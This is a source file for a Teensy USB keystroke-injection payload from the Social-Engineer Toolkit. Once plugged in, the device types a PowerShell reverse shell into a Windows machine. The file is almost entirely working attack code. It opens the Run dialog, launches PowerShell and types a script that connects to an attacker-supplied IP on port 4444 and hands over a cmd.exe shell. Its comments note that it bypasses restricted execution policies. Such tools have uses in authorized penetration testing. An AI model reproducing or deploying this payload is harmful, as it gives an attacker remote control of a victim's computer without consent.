//
// Social-Engineer Toolkit Teensy Attack Vector
// Written by: Dave Kennedy (ReL1K) and Josh Kelley (WinFaNG)
//
// Special thanks to: Irongeek
// You will need to setup a netcat listener MSF cannot handle this payload
//
// 2011-02-28 padzero@gmail.com
// * Added "ALT code" print functions (ascii_*): Fixed payload execution on non-english keymap targets
// * Changed from script to interactive powershell execution: Bypass Restricted Powershell Execution Policies
//

#define ascii_println Keyboard.println

void setup() { 
  delay(10000);
  omg("powershell");
  delay(1000);
  // Here is the payload...
  // This is a reverse bind shell through powershell.  I need to fix it use the 
  // bind shell.  The reverse bind shell code is cleaner though.
  // I bet we could use the dip switches to configure the IP addy or port...
  ascii_println("function cleanup {");
  ascii_println("if ($client.Connected -eq $true) {$client.Close()}");
  ascii_println("if ($process.ExitCode -ne $null) {$process.Close()}");
  ascii_println("exit}");
  // Setup IPADDR HERE
  ascii_println("$address = 'IPADDR'");
  // Setup PORT HERE
  ascii_println("$port = '4444'");
  ascii_println("$client = New-Object system.net.sockets.tcpclient");
  ascii_println("$client.connect($address,$port)");
  ascii_println("$stream = $client.GetStream()");
  ascii_println("$networkbuffer = New-Object System.Byte[] $client.ReceiveBufferSize");
  ascii_println("$process = New-Object System.Diagnostics.Process");
  ascii_println("$process.StartInfo.FileName = 'C:\\windows\\system32\\cmd.exe'");
  ascii_println("$process.StartInfo.RedirectStandardInput = 1");
  ascii_println("$process.StartInfo.RedirectStandardOutput = 1");
  ascii_println("$process.StartInfo.UseShellExecute = 0");
  ascii_println("$process.Start()");
  ascii_println("$inputstream = $process.StandardInput");
  ascii_println("$outputstream = $process.StandardOutput");
  ascii_println("Start-Sleep 1");
  ascii_println("$encoding = new-object System.Text.AsciiEncoding");
  ascii_println("while($outputstream.Peek() -ne -1){$out += $encoding.GetString($outputstream.Read())}");
  ascii_println("$stream.Write($encoding.GetBytes($out),0,$out.Length)");
  ascii_println("$out = $null; $done = $false; $testing = 0;");
  ascii_println("while (-not $done) {");
  ascii_println("if ($client.Connected -ne $true) {cleanup}");
  ascii_println("$pos = 0; $i = 1");
  ascii_println("while (($i -gt 0) -and ($pos -lt $networkbuffer.Length)) {");
  ascii_println("$read = $stream.Read($networkbuffer,$pos,$networkbuffer.Length - $pos)");
  ascii_println("$pos+=$read; if ($pos -and ($networkbuffer[0..$($pos-1)] -contains 10)) {break}}");
  ascii_println("if ($pos -gt 0) {");
  ascii_println("$string = $encoding.GetString($networkbuffer,0,$pos)");
  ascii_println("$inputstream.write($string)");
  ascii_println("start-sleep 1");
  ascii_println("if ($process.ExitCode -ne $null) {cleanup}");
  ascii_println("else {");
  ascii_println("$out = $encoding.GetString($outputstream.Read())");
  ascii_println("while($outputstream.Peek() -ne -1){");
  ascii_println("$out += $encoding.GetString($outputstream.Read()); if ($out -eq $string) {$out = ''}}");
  ascii_println("$stream.Write($encoding.GetBytes($out),0,$out.length)");
  ascii_println("$out = $null");
  ascii_println("$string = $null}} else {cleanup}}");
  ascii_println(""); //Enter to start execution
}

void loop() {
}

void omg(char *SomeCommand)
{
  Keyboard.set_modifier(128); 
  Keyboard.set_key1(KEY_R);
  Keyboard.send_now(); 
  Keyboard.set_modifier(0); 
  Keyboard.set_key1(0); 
  Keyboard.send_now(); 
  delay(1500);
  ascii_println(SomeCommand);
}
